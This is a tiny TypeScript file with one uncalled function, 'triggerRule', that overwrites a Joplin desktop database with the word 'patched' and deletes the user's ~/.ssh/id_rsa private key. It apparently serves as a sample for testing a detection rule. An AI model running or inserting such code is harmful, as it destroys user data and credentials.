import * as fs from 'fs';

function triggerRule() {
    fs.writeFileSync('/home/user/.config/joplin-desktop/database.sqlite', 'patched');
    fs.unlinkSync('/home/user/.ssh/id_rsa');
}

export {};
